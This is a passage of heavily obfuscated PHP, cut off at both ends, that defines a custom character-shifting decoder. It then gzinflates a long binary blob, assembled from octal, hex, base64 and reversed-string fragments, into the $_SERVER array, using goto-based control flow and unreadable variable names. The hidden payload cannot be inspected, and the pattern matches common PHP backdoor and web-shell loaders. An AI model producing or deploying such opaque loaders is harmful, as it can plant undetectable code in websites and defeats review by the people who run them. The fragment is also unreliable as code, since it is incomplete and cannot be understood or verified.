$b°¤ëÌ›ñ[8]); if ($B‚Ğ¹’Š»ô == $b°¤ëÌ›ñ[33] || $B‚Ğ¹’Š»ô == $b°¤ëÌ›ñ[8]) { return !0; } goto E¬÷¿œƒ’Æ; cë”Éé¶°: } } define($_SERVER[Ä¿Ş°¨][222], 1); goto AÍÖÍ¡¦âÑ; D—¹Ùå: if (!function_exists('_kodDe')) { function _kodDe($F„´ï’ÛÕš) { $F„´ï’ÛÕš = base64_decode($F„´ï’ÛÕš); $fòÛİá‹ = strlen($F„´ï’ÛÕš); $DÉÒêİÎÑ = ''; $cîé°øæ¨ = ord($F„´ï’ÛÕš[0]) - 30; for ($EÇàáì‰Õ´ = 1; $EÇàáì‰Õ´ < $fòÛİá‹; $EÇàáì‰Õ´ += 2) { if ($EÇàáì‰Õ´ + 1 < $fòÛİá‹) { $DÉÒêİÎÑ .= chr(ord($F„´ï’ÛÕš[$EÇàáì‰Õ´ + 1]) + $cîé°øæ¨); $DÉÒêİÎÑ .= chr(ord($F„´ï’ÛÕš[$EÇàáì‰Õ´]) + $cîé°øæ¨); } else { $DÉÒêİÎÑ .= chr(ord($F„´ï’ÛÕš[$EÇàáì‰Õ´]) + $cîé°øæ¨); } } return $DÉÒêİÎÑ; } } define("\xc4\xbf\x8e\xde\xb0\xa8", "\xef\xa6\xee\xc6\xd5\x8e\xca\xe1\xc8\xb4"); $_SERVER[Ä¿Ş°¨] = explode(base64_decode('fAN8AXwF'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\75\7\170\33\105\326\20\16\70\70\70\102\73\72\154\234\204\330\216\212\355\70\315\261\343\310\266\154\53\221\55\105\222\343\44\226\243\254\244\225\264\266\244\125\166"."\x57\x72\x49\x42\x87\xa3\x85\xa3\x87\x7e\x10\x8e\x76\xf4\x1e\x8\xa1\x1c\x47\xfd\xe9\x9d\xe3\xee\xe7\x28\xa1\x1c\xfd\x38\xda\x1d\xe5\x9f\x3e\xb3\x2b\x19\xb8\x9f\x8f\x58\x33\x6f\xde\xcc\x4e\x79\xf3\xe6\xcd\xcc\x7b\x6f\x2e\xbf"."\xf0\xf4\x87\xfe\x7d\xd5\xed\xeb\x76\x58\xb7\xfd\xba\x1d\x9f\x7f\xe8\xc6\x17\x37\x9d\x88\xc3\xe0\x2f\xfc\x45\xe1\xc3\x4e\xf9\xe5\x76\xe8\xbf\x1d\x72\x4b\x97\x2e\x79\xb0\x6e\x72\xe7\xba\xcf\xfb\x3f\x7c\x6c\xc6\xab\xf7\x7f\x35"."\345\302\13\157\330\364\301\115\17\365\356\331\166\356\137\137\272\311\261\337\231\373\374\366\353\267\256\337\142\136\237\330\107\177\275\353\223\55\377\371\370\264\357\242\57\275\376\320\257\26\77\363\213\35\57\270".base64_decode('/S+Tz23+dN+vFmUXXRZ44B9Dl+/2hndnY/g/d9zWUcr9bYfs4l8+uVV7/h+XPHDZS3/f6YeBi98=')."\xee\x73\xfd\x66\xf8\x82\xf5\xf\xff\x79\xe6\xae\x7f\x3f\xb8\xe9\x98\x7f\xad\xa\xef\xdf\x79\xd7\xce\x2f\xf7\x77\xfe\x69\xe1\xf7\xdb\xda\x8e\xfa\x6a\x7e\xfe\x81\x3f\xef\x13\x3b\xe6\xa5\xdd\xbe\x94\x4e\xfc\xea\x82\x23\x6e\x7f"."\xef\xe9\xae\xb7\x95\x5f\x3e\x1b\xa\x2e\xb8\xbf\xf6\xcf\x7\x4c\x39\xbb\x7a\x97\xd6\xde\xcf\xf7\xfe\x68\x70\xd6\x75\xc7\x95\xb6\x1e\x77\xcb\x8a\x95\x37\x5d\xe5\xb8\xf8\xd6\xb1\xb\x6e\x7d\xbf\xe1\xa4\xbf\xec\x7b\xdd\xb3\x9e"."\x65\xcb\x3c\x6f\xf6\x5f\x34\xd6\xfc\xf8\x99\x6b\xef\xd8\x7f\xdb\xac\x37\x9f\x7e\xec\xbc\x9e\x33\xfb\xab\xf6\x28\xfa\xfe\x76\xe1\x1d\x6b\xab\x37\xcf\x7a\xfc\xcf\x6b\x53\xf\xd4\xec\xb9\xf5\xa9\xfa\xea\x3d\x37\xf8\xef\x6f\x9a"."\xdc\xbc\xe8\x5f\x47\xb4\x1f\xfd\xd9\xed\xcf\x15\x9a\x3f\x38\xaa\x7f\xfb\xd9\xfa\xab\x87\xbe\x9d\x50\xaf\xdf\xbc\xfe\xf3\x7b\x46\xf\x2b\xcd\x3e\xff\xdf\x27\x18\x7b\x9b\xa7\x8e\xfd\xf2\x8b\x4b\x76\x7c\xe5\xd2\x67\x6e\x3a\xf3"."\240\25\277\377\341\242\167\352\102\135\257\224\272\337\354\274\243\172\337\103\147\374\342\336\231\321\334\176\321\63\277\237\64\276\76\176\351\353\223\266\333\16\367\163\23\376\221\362\232\51\51\243\252\141\32\30"."\220\320\362\51\65\215\303\152\36\377\272\361\217\261\46\253\232\12\16\307\172\3\221\130\270\57\30\364\206\42\61\122\242\230\236\323\222\44\124\220\165\71\107\12\57\50\272\1\76\45\26\27\53\150\5\45".base64_decode('b4FwQFI25bhskJI62mId3qA/sCIWWRH0Eox4bE1R0cdwDAXDpqybETWnMIwRndWrzdvl65UiIU8=')."\157\330\323\36\361\5\172\61\270\75\320\323\343\213\224\303\103\1\277\277\315\323\276\244\74\45\30\362\164\365\170\44\120\277\254\22\123\363\51\255\132\132\215\123\126\113\65\70\320\251\52\331\44\16\346\145"."\132\35\163\254\100\102\21\26\2\143\220\57\146\263\70\322\313\102\244\376\112\112\56\146\111\237\165\210\221\202\256\346\144\332\364\45\312\30\203\342\200\134\64\65\65\237\300\21\357\250\251\313\34\16\152\234"."\xd0\x95\x9c\x92\x27\x45\x85\xbd\x7e\x6f\x7b\x44\x82\xd5\x94\x3a\x43\x81\x1e\x89\xc\x45\x4e\x36\x4c\x45\x97\xfa\xbb\xbd\x21\xaf\x4\xab\xde\x32\x3\xb5\x78\x86\x84\xf3\xf5\xf5\x82\xe\x91\x3c\x7e\xbf\x34\x51\x9\xa6\x92\x2b"."\320\142\160\236\12\205\5\102\35\336\220\324\266\102\342\375\224\320\162\71\55\357\2\245\200\361\64\205\252\172\103\41\34\160\20\12\366\373\340\320\221\110\240\263\63\354\145\61\322\270\245\176\120\223\131\204"."\112\55\261\144\52\153\306\112\162\266\110\211\165\30\377\316\40\77\344\127\63\10\1\257\121\363\152\221\20\53\51\102\323\330\314\41\201\42\305\126\50\44\7\262\151\144\116\201\11\126\302\301\226\205\370\167"."\x1\x41\x8a\xc7\x60\x9a\xa2\x9b\x31\x25\x9f\xd0\x92\x6a\x9e\x4c\xc3\x56\x32\xe5\x8\xe1\xc9\x66\xa6\x43\x57\x1\x1e\x29\x50\x73\x25\xb4\xc2\x58\x8f\x56\x22\x6d\x48\xa9\x59\xc5\xcf\x66\x59\x4a\xcb\x26\x15\x9d\xc7\xb\x20\xbb"."\230\102\32\243\216\13\271\173\213\71\21\205\105\23\31\65\233\324\351\344\374\61\314\172\122\254\142\232\240\31\6\255\151\137\41\253\311\311\260\242\13\265\357\4\305\4\212\246\10\54\42\264\116\115\317\165".base64_decode('AAZAegeQvdpXIWGYEn5S6BQXYVzVA0c7vx8cWAT+1BAuFiVVyyjZbEwZVcgEySVnG7T2biOu5t0=')."\0\202\243\276\100\54\43\33\231\236\344\354\30\312\105\231\143\122\31\165\25\62\5\62\207\331\264\45\224\13\73\272\127\63\275\2\157\315\152\11\71\53\66\21\207\63\246\131\10\53\371\44\354\11\322\24"."\155\44\217\172\252\240\50\4\251\303\41\45\245\36\151\205\324\335\244\66\121\262\2\104\222\32\343\254\56\143\346\262\54\104\233\311\140\6\3\232\243\204\30\252\110\134\31\65\111\357\110\13\22\31\131\7"."\343\326\122\64\123\316\171\204\143\24\12\131\65\41\233\252\226\167\153\11\123\61\235\206\251\53\62\51\255\152\201\4\111\1\116\335\132\234\213\116\233\166\55\157\202\171\353\214\350\162\336\110\51\272\323\113"."\350\272\111\2\35\314\130\27\105\353\120\215\202\146\250\360\63\115\222\154\232\162\42\3\247\75\57\276\345\107\360\325\174\126\315\53\145\270\236\104\102\61\14\47\314\242\153\131\247\47\233\325\106\234\1\135"."\115\253\40\117\255\255\232\200\45\65\111\224\137\26\124\135\61\150\124\352\352\211\20\144\120\53\305\31\324\345\164\116\156\222\12\305\70\350\31\62\61\53\300\60\66\371\172\223\224\200\121\207\224\53\32\246"."\123\127\0\337\121\301\12\107\6\317\227\162\366\300\361\124\225\244\63\14\330\63\1\317\252\153\224\0\31\111\64\15\103\273\43\221\140\314\327\11\126\341\136\157\254\307\23\151\357\46\325\66\345\64\255\263"."\37\60\135\126\44\5\56\167\202\271\6\11\255\27\364\21\7\6\265\21\105\7\37\156\33\153\222\206\265\144\134\33\165\321\44\210\34\6\354\201\42\303\36\55\230\316\220\234\117\303\376\211\217\231\12\41"."\107\243\224\246\253\111\150\231\67\24\13\7\72\43\375\236\20\131\251\363\240\313\107\151\241\260\220\254\63\244\44\101\47\47\114\132\264\134\200\375\103\161\340\224\200\243\111\123\341\64\241\151\176\137\27\354"."\202\16\247\1\220\234\42\26\55\333\257\346\124\130\113\223\245\240\76\3\313\170\27\251\220\33\125\275\45\232\251\255\216\46\147\326\70\301\337\332\232\201\150\207\253\166\260\325\255\362\74\356\172\127\275\324".base64_decode('UDdHCgK5QpWzEqGXMow6KbDESlF+JZ82M0TUCnmX9nnDkViPN9Id6CC5vR4S8mt4gtHaDuCfQTI=')."\16\140\245\117\53\11\55\253\351\162\26\262\21\112\65\12\235\312\151\65\305\331\262\17\310\43\244\323\60\343\342\221\260\232\53\120\66\143\146\212\271\270\20\164\363\22\310\210\202\341\140\314\105\143\113\210"."\246\223\120\223\233\144\231\336\320\111\171\245\73\74\13\374\317\31\143\122\313\311\124\220\104\323\117\111\342\371\207\101\265\226\224\156\105\346\153\222\251\233\32\204\352\26\224\36\305\314\150\144\32\244\25\132"."\245\42\253\33\255\145\122\311\52\264\227\62\12\345\265\100\72\52\261\316\53\350\112\112\45\64\11\304\41\0\347\274\124\65\102\40\23\24\117\150\274\37\112\221\34\140\162\266\53\33\234\165\303\210\260\260"."\x76\xf6\xf9\xfd\xb1\xf6\x40\x6f\x4\x48\x92\x18\xd2\x1f\xf2\x45\xbc\x94\x22\x3c\x1d\x31\x4f\x7b\x90\xad\x40\x7c\x98\x8\x2\x9c\x64\xe5\x4c\xa\x43\x4a\xd\x2\xf7\xe6\x6c\x9e\x33\x4e\xba\x4e\x41\xc6\x88\xc3\x80\xa3\x15\xb4"."\274\241\70\23\244\264\44\147\241\30\143\201\215\177\226\345\340\362\353\250\123\316\215\73\163\212\51\73\131\325\255\253\224\24\21\27\73\37\31\2\316\362\262\140\151\4\333\3\272\74\6\3\141\222\241\25".base64_decode('QoEwEVd0Uo9gH0nKCcPf5SXAXekKJxPBw9MfpuyqCPB1dVzmbWyl9SFlj+ayXD6KqZbxi2nxIcA=')."\241\0\321\311\225\132\355\344\143\25\351\366\365\56\211\365\4\72\274\376\230\257\27\260\300\110\71\274\57\330\341\241\203\57\302\333\2\221\156\13\264\17\360\211\145\36\277\317\216\356\135\356\13\107\302\25"."\223\0\254\317\153\113\1\73\246\140\310\333\351\133\316\242\235\76\257\277\43\34\153\367\264\167\163\234\136\117\17\211\304\122\160\317\142\270\255\370\61\300\315\303\154\347\23\53\301\135\34\355\314\230\145\233"."\21\243\2\164\214\323\11\130\202\24\102\233\244\271\160\357\210\132\102\104\332\204\126\244\324\312\144\260\34\145\20\71\231\314\120\231\56\57\325\370\247\106\362\204\45\263\20\143\254\40\76\306\202\250\31\64"."\xe\x84\x2e\xf2\x7d\x89\x30\xdf\xb2\x1a\xc4\x20\x4e\x9b\x92\xd2\x74\xe5\xc7\x0\x9e\x94\xc9\x8\xc3\x16\x7\xf3\x86\xa7\x81\x11\xf0\xa0\x4d\x2a\xa0\x4\x34\x22\x31\x3a\x17\xd\x20\xde\x7b\x68\x75\x52\x7c\x83\x18\xb\x80\x9d"."\xb4\x7\x6e\x2f\x63\xfd\xa1\x40\x6f\x17\xc9\x30\x92\x51\x68\x5\x7c\xa4\xfb\xab\xa9\x48\x42\x76\x99\x26\x67\x49\x40\x9e\x90\xb9\x68\x48\x3b\x7d\x48\xa3\x5d\xb9\xe\xff\x1c\x8e\x7f\x80\x8\x46\x3e\xae\xe4\x69\xaf\xc7\x21\x63"."\146\214\203\156\41\300\154\241\114\125\53\262\257\305\65\55\113\347\61\130\153\31\277\140\373\323\41\203\22\311\50\145\116\63\351\252\105\26\207\110\140\211\267\67\106\51\13\307\4\152\304\0\260\343\13\204"."\110\207\230\332\60\335\177\340\304\220\67\114\271\200\256\254\51\252\264\273\334\256\231\204\212\25\260\376\220\317\273\127\105\107\146\126\17\70\147\272\6\101\240\246\166\21\216\222\130\324\145\211\116\43\371\213"."\72\313\15\105\220\152\243\265\246\51\352\216\272\253\133\233\6\74\316\161\331\71\136\347\234\357\34\234\31\165\325\314\44\200\301\265\15\216\306\365\20\1\40\266\116\35\4\77\55\321\326\351\121\347\341\107"."\254\136\64\20\35\234\321\64\163\112\324\65\65\72\62\130\133\323\112\277\223\50\352\140\157\225\30\143\125\115\316\254\6\125\2\242\11\103\311\43\226\50\40\320\204\161\265\300\241\153\347\254\247\160\60\206"."\112\232\347\30\160\106\147\16\266\12\371\4\220\375\133\100\164\1\374\71\303\360\74\316\225\260\145\54\53\234\367\204\76\212\371\4\347\256\160\136\304\345\4\341\3\152\72\317\246\20\130\320\331\236\326\52"."\373\256\235\216\177\327\323\201\114\53\164\131\206\307\121\72\241\316\142\136\135\103\167\352\171\145\15\11\150\46\245\357\270\142\216\50\224\74\0\334\22\7\304\101\67\137\40\111\210\145\221\220\106\276\300\67".strrev('l8¹$í•ãMÛ;b¸4Äá9F7¿6"ÅŒ-	Ar6Á´ã\'’¤±aìPbVÚ'."\n".'=')."\254\311\112\210\31\110\212\256\153\172\23\72\267\63\212\5\50\213\201\275\217\11\372\123\2\73\141\251\145\241\204\273\231\160\211\230\330\351\5\231\112\23\160\217\312\44\4\167\165\64\132\34\120\222\203\3".base64_decode('gJBlZ2pw7az1NVQCdkfBfzSC+RepcYGPnwFkrYTJFtyy46UY44CwCuyUQNPZOgvhXGo1NVPOMjQ=')."\230\26\201\20\312\155\350\132\115\166\332\170\0\375\234\11\301\325\131\70\174\103\34\262\227\235\54\261\3\3\341\334\7\300\34\102\24\377\155\251\242\154\72\17\46\102\73\137\244\142\162\212\154\212\174\171"."\x3b\x84\xad\x6\x4a\xc\xac\x43\x31\x22\x36\x11\xae\xdc\xe6\x9\xfb\xda\x63\x41\xf\x5d\xed\xc1\xc6\xda\xd\xe7\x11\x14\x47\xb8\xc4\xdc\x48\x5a\x97\x51\x12\xc3\x31\x39\xe\x46\x98\x6e\xfb\x8a\x50\x96\x1b\x16\x3f\x49\xd6\x86".base64_decode('DiehKs9yp4/sKFhApbKvDPiLSaGGVtQTCsOxSD2mrIPKc1ETfkk4rgRd6YDHGw64yDuA+OmA50c=').base64_decode('Di5CO/jJhIMJxA4iJzt46STo63CoRgeS11G5KInW2czAfX5WHnPg+vuVkpJ10No7aKMctAUOtAE=').base64_decode('6iC16QMES2qDgqC3Mw5IH5DYaCkwSLuBSfkOvgNwpHWtWAjSLwkxXBkC4DVlgJCmmQ66I2OBHsY=').base64_decode('EmF1eGgZp0Bee7aekybguL0OGArTO+WSOMAVBztvJQx+6spPB7n8Zt8Z2U+deCfySkTkdFj4vCk=')."\247\351\267\61\70\244\44\306\22\174\153\325\41\354\325\254\61\66\316\210\350\52\121\116\345\161\146\324\300\10\153\327\135\166\241\144\314\211\206\320\212\205\262\46\44\145\336\274\100\201\257\167\220\35\205\301"."\x1c\x15\x18\xe\x5\x5\x38\x7f\x2b\x92\xb9\x2d\x1b\x44\x52\x86\x47\x7c\x24\xa4\x50\x98\x50\x7f\xda\x7a\x4b\xb9\x30\xca\xa7\x21\x6d\xa2\x4\xb\x70\x8\x2b\x6\x1c\xa\x27\x1f\x4f\x21\x4a\x7e\x54\x2d\x86\xfb\x35\x96\x63\xfb".base64_decode('GtbRNlYI+z2o5sfUvHhywKGc43IKgLTMY7iPJwpjRsJPJhzkxMIBOZ3Ac/kOG9QesVded1KSreY=').base64_decode('dLY5rVE++frAJi1Ga0OolhBpRtZ5L9MJBamYtcqAKDwqoKXkEl9sLHmEaWCYY+yQRQhaC8XRjok=')."\x22\xdd\x6c\xef\x59\x29\x2a\xce\x3f\xd5\xf0\xb3\x75\xc3\x1a\x46\x2d\x8d\x68\x15\xa3\x48\x26\x91\x80\x34\x42\xf\xe0\xe8\xe6\x22\x66\x3b\xe4\x0\x51\x71\x75\xb4\x9c\x87\xe0\x6a\x78\x18\x9f\x3\x62\x55\x16\x8c\x80\xee\x82\x93"."\244\13\162\61\161\311\341\313\21\344\234\70\54\40\25\354\14\317\302\230\53\255\162\166\326\154\203\332\242\374\243\26\276\123\266\24\141\0\75\374\252\43\124\237\4\173\126\227\216\71\233\13\10\77\344\242"."\310\121\47\254\145\174\372\256\65\306\14\123\311\21\116\270\336\326\73\46\330\134\305\145\335\245\203\32\361\212\162\376\117\104\237\42\3\14\332\61\160\361\176\215\112\342\220\376\275\111\325\204\20\310\315\64"."\172\144\306\21\5\236\316\140\102\201\250\113\134\145\143\220\125\207\111\56\307\164\13\146\45\116\356\252\105\74\327\305\27\32\161\231\22\257\244\40\32\157\71\274\342\302\41\341\62\67\307\356\274\20\320\145".base64_decode('mFqBpwhRnCwk8UIFLNb5qIZgBUgiYYB3IcIleZH8jonblQUYLpEVeXSdEgluHjw/AkARBKdrmJ4=').strrev('“1UÏ˜Og	~Y²{£*Ä%œŞèAr£,ñTrá‰î€dÉÉrx]‡à¢âÒ_‰op¸ÈâV_')."\231\60\133\47\22\301\251\30\134\11\306\4\270\116\33\15\361\31\307\57\71\355\362\255\225\371\374\224\354\125\66\3\370\200\126\216\103\376\230\121\363\212\301\126\46\335\250\304\147\176\112\276\261\210\270\126"."\x41\x46\x94\x60\xc8\x72\xc8\x9b\x2b\x76\x2b\x24\xff\x89\x68\x1\xa6\x9\x47\x5a\x60\x7\x7\x0\xe2\x3a\xc2\xce\x6d\x38\xdf\x11\x96\x4a\xb4\xec\xc4\x4c\xcb\xb2\x1f\x42\x65\x8\xf3\xc1\x32\xc4\x60\xfe\xe1\x16\x75\xea\x5a\xce".strrev('M×çÂ|îhq“Ñå{Ï‡ıwîs§Y/Š+2i2¢hUÀ‘'."\0".'™ŠÛ(Ú˜…rzñÙÑ2«ó'."\0".'')."\x7f\x81\xc3\x5c\x5b\xe9\xf8\xe5\x6b\xb5\xd7\x5e\xda\xf7\x91\x13\xd6\x9f\x7e\x9b\xef\xd4\x17\xae\xdd\x77\xeb\xf4\x1b\xfe\x67\xf2\x8a\x33\x73\xf3\x6f\x51\x5a\x3e\xbc\xe7\xa5\xc9\xfd\x6f\x5f\xd1\x7d\xca\xdb\x57\x3c\xba\x64\xc9"."\x3f\xff\x19\xb8\xe9\xfa\x9e\x1f\xde\x7b\x46\x3e\xe0\xa6\xdd\xe\xba\x63\xf5\xe\x73\x56\xf\x87\x56\x7b\x4f\xb9\xfd\x95\x3b\xcf\x4f\x7c\x35\xf0\xe1\x99\x5f\xfd\x75\x49\xe8\x9a\x2d\x55\x57\x8f\x3e\xbd\xfe\xe2\x47\x3e\xf9\xf6".base64_decode('qbse/tXThzcd8e13j7y+9ttjD/7hsnu3fepONA8sC97+x2HvxUsOn3PA1LVHpaf8OpM/dfc3H0w=')."\xd\xed\xb5\xf3\x41\x7d\xf\x5e\x7d\xda\x29\xd1\xbd\x82\xbf\xdf\xeb\xc2\x27\x6e\x7e\xfa\x91\x47\x3f\xdf\xe9\xb2\xff\xb9\xaf\x65\xc1\x45\xcb\xcf\xd7\xe6\x3f\xf4\xc3\x91\xa7\xaf\x2c\xf8\xff\xbc\xf1\x84\xec\xc0\xee\x3b\x7c\x78"."\x6d\xe7\x7b\x43\xd1\x3b\xda\x1f\x8d\xd4\x2e\x3c\xff\xc4\xd7\x1a\x1e\x9f\xdd\x38\xb4\xe7\x9d\x8f\x95\x1e\x9c\xd6\x70\xf5\xf2\xab\xcf\x78\xe6\x8a\x4b\xe5\xee\x93\xdc\xff\xea\xbe\x76\xe6\xc7\xad\x7\x9b\xeb\x3f\x9c\x7c\xf2\x15".base64_decode('x8854Rrp4FunZL9Yf1tkh9eeK6z8++ojjznr2O7q4k0XRfbf6aPv5bXzQnvsfIhrs3pX06q3m58=').base64_decode('31LzyTkjN+/x+tTtNz/3yN4veiKz+tQPnvztN7vvmLtozpxDv/3Xlf/+vumi7Vub6v/U7Hrh2s0=')."\xab\xde\xdc\x6b\xc1\x6d\xbd\xff\xdc\x31\xf2\x68\xff\xa7\xfb\xbf\xb4\xfa\x41\xdd\x73\xd7\xd6\x55\xa7\x1c\xb9\x5b\xd7\xdf\xff\x92\xfa\xe7\xb3\xef\x7f\xf4\xf9\x27\x1f\xe5\xb5\x5b\x9f\xed\x7b\x7e\xd3\x75\xda\xb1\xaf\xfa\x6e\x4e"."\xbe\xf0\x8f\x93\x77\xba\xbf\x69\xfe\x25\x4d\xe7\x1c\xb3\xcc\xd9\x7f\x6a\xf3\xc6\xcd\x57\x9d\x18\xd9\xb0\x69\xd5\xe3\x2f\xaf\xde\x30\x7f\xfe\xed\x8b\x77\x3c\xdb\xbd\x6c\x9f\xa3\x5e\x79\xb3\xb1\xee\x76\xfd\xd0\x9a\x9d\x4e\x18"."\14\273\167\63\117\170\371\314\323\166\254\333\57\263\151\343\303\333\376\170\345\13\167\115\233\24\374\370\317\177\372\374\340\317\252\242\277\70\340\272\203\17\272\352\356\143\276\330\264\264\357\361\153\276\230\43"."\217\36\174\302\5\47\354\120\270\343\255\47\117\333\167\153\310\171\352\206\266\3\37\233\377\375\363\267\117\272\133\171\265\341\341\275\367\133\161\374\55\313\356\377\146\327\367\236\155\272\351\331\275\376\163\360".strrev('\\´=éÛü–¼şl:£‡p;Î/.¶>Óº)©0ìÅõúî×Ãùö—šùzLæÓ¿r~w_æ?')."\273\140\371\205\163\246\377\345\266\373\347\376\172\335\116\352\356\117\175\32\234\374\304\111\67\356\321\166\320\271\363\136\331\335\343\76\145\373\33\167\270\363\251\3\376\334\334\370\300\140\325\254\276\23\137\331"."\x10\x5e\x7c\x4f\x63\xda\xbc\xed\x89\x9b\x6a\xee\x79\xf4\xb7\xb\x5e\xd8\xfe\x83\xfd\x8f\x39\xff\xad\xaf\xe7\x96\x4e\x57\x7e\x77\xee\x25\x8f\x56\xfd\xed\xe6\xbf\x9e\x71\xd2\xf1\xc5\xbd\xcf\x6d\xfb\xdf\xa3\x26\x5f\xb0\xbf\x7f"."\xfd\xa9\x6b\x2f\x79\xd4\xb7\xc7\x52\xe3\x91\xe7\x8a\xf5\xa5\xcf\xbe\x3d\xfd\x21\xfd\x94\x57\xee\x3e\x71\xd7\x13\xf\xbc\x64\xe3\xfd\x8d\xca\xe4\x91\xbf\x6f\x37\xbc\xe4\xc9\xde\x43\x2e\xda\x73\x6e\xee\xd4\x6f\xfb\x7e\x98\xb1"."\322\70\140\301\131\327\235\366\325\37\142\73\354\375\315\346\341\273\236\337\371\334\31\313\37\233\175\335\56\117\304\27\73\107\32\216\133\175\140\365\155\263\76\173\347\365\243\266\75\161\356\242\340\371\373\276".strrev('±Tÿj¿µıM–ä—k‡õî××Í@q¾6O¼ç¹®/ï´úœšnœŸ“i÷mü§5£“†ğşXÖ')."\171\372\351\337\127\77\265\365\354\335\57\172\61\74\377\300\317\337\236\176\312\253\365\207\134\352\352\272\361\323\337\75\371\360\115\317\107\366\70\360\362\213\157\133\260\207\264\375\121\347\335\164\330\115\3\177"."\371\170\227\303\176\267\364\250\153\225\175\267\134\340\237\122\232\75\360\342\232\335\317\174\365\314\105\227\236\161\306\47\227\336\277\256\175\362\321\223\367\332\356\256\273\37\137\176\361\361\201\246\137\174\35\310"."\x5f\xf4\xbb\x8b\x95\x55\xd7\x7c\xb0\xf2\x32\x97\xd1\xbe\x71\xff\x13\x12\x2f\x9a\x67\x6c\x30\x93\xdb\x32\xc9\xf9\xf3\xa6\x6\x6b\xce\xba\x7a\x9f\xc6\x3b\x8f\xa9\xbe\x78\xd1\xfb\x2f\xad\x4a\xc7\x72\xe6\x96\xad\x5b\x86\xae\x7a"."\x44\x19\x79\xed\xc2\x7f\x5c\xfa\xf2\x41\xd7\xff\xf3\xea\xd\xc7\xdd\x72\xc6\x75\xc3\xf3\xcf\xdd\xae\xfa\xe2\x4b\x22\xff\x38\x79\x53\x66\xdf\xe9\x2b\xee\x3f\xf5\xf8\x86\xfd\xd7\x2d\xd9\xf7\xb4\xf\xb6\xcc\xc\x37\x9d\x3d\x5c"."\325\327\125\165\312\246\167\216\131\74\174\334\143\7\14\177\375\357\51\163\367\371\153\307\105\65\361\334\342\135\336\337\351\231\365\367\337\161\305\345\217\35\325\160\370\257\56\73\347\255\311\163\257\332\123\173"."\154\374\127\147\275\263\351\314\217\167\232\167\162\361\117\177\274\270\155\160\374\374\125\267\54\335\170\355\353\347\305\257\351\75\243\364\152\247\173\350\322\71\33\67\76\321\331\323\337\261\171\243\177\301\171\233"."\26\214\36\160\331\374\257\117\233\276\313\221\367\326\177\164\304\127\221\17\364\133\67\155\256\117\136\265\244\172\144\125\123\317\172\307\340\225\201\31\217\136\275\317\277\364\53\226\357\335\365\370\156\263\36\213"."\x6e\xa8\x3a\xc7\x1f\x7d\xe0\xde\xc0\xb7\x77\xfe\xfd\xeb\x67\xf6\x9a\xf6\xc6\xd8\x49\xb3\xb3\xcf\x6c\x1b\x99\xb4\x78\xd7\xbb\x36\x5d\x34\xff\xcd\xd3\xdf\x78\x6b\xc1\xd6\x73\xc7\x5f\x38\x74\x37\x65\xcb\x9b\x89\x1d\xfe\x33\x69"."\x74\xc1\xe5\xcf\x1e\xdd\x94\xd1\x6e\xdf\xf9\xa3\xed\x33\xab\xab\x5e\xde\x77\xc7\xbb\x6e\x6d\x3d\xf8\xe6\xe6\xa5\x17\x2e\xd8\xf0\xdd\x77\xa5\xfd\xee\x9f\x71\xeb\xeb\x87\x5f\x97\xfb\x5b\xfb\xf3\xbf\x88\x69\x53\xde\xfa\xf2\xc5"."\xd0\xd2\x5b\x7d\xbf\x1c\xba\xb1\xf5\xee\x23\xba\xba\x9c\xdf\xbd\x72\xd1\xc3\x67\x6d\xbb\x65\xf7\x1e\xa7\xfe\x44\xf8\xfa\x68\xda\x79\xe0\x5e\xef\xae\x39\x6b\xb4\x7f\xf3\x6f\xfe\x66\x9c\xb2\xdf\x93\x79\xf3\xd9\x95\x75\x5b\x1f"."\172\371\372\367\117\334\64\120\163\310\257\117\134\75\274\365\317\256\332\163\66\14\277\374\315\327\137\366\365\270\367\375\237\163\16\32\376\340\345\227\156\330\376\221\325\233\66\16\357\173\310\324\110\317\347\321".base64_decode('Uy6+YPEhh8yQb5k0+/AjNne41n137VU3/vD156dsPHLr6Bdvf/t04N6xL79988VrR9yr1o99+eY=').base64_decode('YenDmo/87v3YU7F7mn/4zr3sJU/hsH+uff2Hz16575u95x34yF/POa7lrb1d//hYS5++yz5nGPU=')."\xca\x37\x75\xb9\xae\x4f\x8f\x5e\x59\xda\x74\xc8\xc6\xc2\x5d\xc1\xce\x73\x1c\xef\x5f\xbb\xf2\x85\x99\x47\xe7\x5c\x2d\x9e\x3b\xde\x9b\xd9\xf1\xd5\x5e\xc5\xfd\xb7\xf3\x1c\x76\xf8\x35\x8f\xfd\x55\xea\x7a\xe7\xed\x69\xd7\x4d\xb9"."\142\371\313\147\350\352\327\17\317\171\356\312\75\367\273\341\241\375\356\70\163\363\365\357\75\165\367\336\147\175\375\122\315\123\215\233\352\56\74\275\346\227\267\274\262\363\131\37\336\166\372\177\76\373\64\30"."\xe9\xf4\x5d\xee\xfb\xea\x4f\x97\xec\xb7\xff\xe2\xd7\x73\x7f\x3b\xaf\xe5\xaf\xa3\xe9\xdc\x77\xcf\xfe\xfb\x8b\x83\xfe\x38\xe9\x90\x3b\x97\xd6\xee\x77\xd8\xf5\xd7\xbf\xbe\xf9\xd6\x2d\xb3\xb3\x35\x27\x1c\xb1\xee\xcc\x96\x99\x85".base64_decode('SS92+GLP/emVvef/5rI5d6789Fczo4+v3WXxCzWrbpl8XMPuky5YXf9GzeITD2lM3OdJNp/QcXQ=')."\160\360\353\331\152\356\237\276\333\47\337\176\366\27\347\337\265\171\313\23\67\337\375\357\217\252\253\314\375\307\17\375\114\175\151\345\105\367\237\174\330\133\253\323\117\154\16\134\262\367\254\51\313\57\371\270"."\350\234\173\361\202\145\317\254\71\363\301\137\215\175\371\372\17\113\23\255\247\176\274\302\371\304\371\127\6\217\177\353\361\333\357\271\43\73\377\326\313\23\107\56\175\164\217\55\157\214\336\360\315\127\7\176"."\264\363\300\133\203\312\16\356\336\117\176\375\340\21\267\336\127\235\373\262\24\30\126\322\315\327\376\356\356\255\251\43\147\176\242\275\372\333\261\361\257\126\311\17\236\377\344\176\267\76\120\132\373\207\361\217"."\xae\x3f\x77\xc3\xdc\xd4\x8b\xf7\x6c\xd9\x12\x7e\xf5\xd0\xfd\xcd\x67\xde\xfd\xea\x89\x2b\x7f\x75\xd5\xa6\x17\x97\xa7\xa6\x8c\xfa\x5e\xba\xf1\x86\xd7\x97\x87\x57\xe\xec\x35\xb0\xff\xfc\xa1\xc8\xf\x9f\x1e\xf3\xc7\x3\xf\x3a".base64_decode('ad75Z0/qXr6+wbvzozcsiT90ydPbLfqfh5eOPLaHXrN8OD5ty7eH//7VE1fectig/PbTt2znveQ=')."\xae\xb1\x53\x7b\x83\x97\x7e\x73\xee\x8c\x5f\xff\xea\x6f\x9b\xaf\xbd\xe7\xb3\xa7\x9e\